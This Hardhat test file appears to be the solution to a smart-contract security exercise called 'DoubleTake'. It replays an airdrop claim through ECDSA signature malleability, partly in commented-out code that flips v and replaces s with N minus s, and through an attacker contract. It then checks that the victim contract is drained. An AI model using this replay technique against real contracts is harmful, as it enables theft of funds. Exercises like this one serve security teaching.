const { time, loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect, assert } = require("chai");
const { ethers } = require("hardhat");

const BN = require("bn.js");

const NAME = "DoubleTake";

describe(NAME, function () {
    async function setup() {
        const [owner, attackerWallet] = await ethers.getSigners();

        const VictimFactory = await ethers.getContractFactory(NAME);
        const victimContract = await VictimFactory.deploy({ value: ethers.utils.parseEther("2") });

        return { victimContract, attackerWallet };
    }

    describe("exploit", async function () {
        let victimContract, attackerWallet;
        before(async function () {
            ({ victimContract, attackerWallet } = await loadFixture(setup));

            // claim your first Ether
            const v = 28;
            const r = "0xf202ed96ca1d80f41e7c9bbe7324f8d52b03a2c86d9b731a1d99aa018e9d77e7";
            const s = "0x7477cb98813d501157156e965b7ea359f5e6c108789e70d7d6873e3354b95f69";

            await victimContract
                .connect(attackerWallet)
                .claimAirdrop(attackerWallet.address, ethers.utils.parseEther("1"), v, r, s);

            // const N = new BN("0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141".substring(2), 16);
            // let S = new BN(s.substring(2), 16);

            // await victimContract
            //     .connect(attackerWallet)
            //     .claimAirdrop(
            //         attackerWallet.address,
            //         ethers.utils.parseEther("1"),
            //         v % 2 == 0 ? v - 1 : v + 1,
            //         r,
            //         "0x" + N.sub(S).toString(16)
            //     );

            const AttackerFactory = await ethers.getContractFactory("DoubleTakeAttacker", attackerWallet);
            const attackerContract = await AttackerFactory.deploy();
            attackerContract.attack(
                victimContract.address,
                attackerWallet.address,
                ethers.utils.parseEther("1"),
                v, r, s);

        });

        it("conduct your attack here", async function () { });

        after(async function () {
            expect(await ethers.provider.getBalance(victimContract.address)).to.equal(0, "victim contract is drained");
        });
    });
});
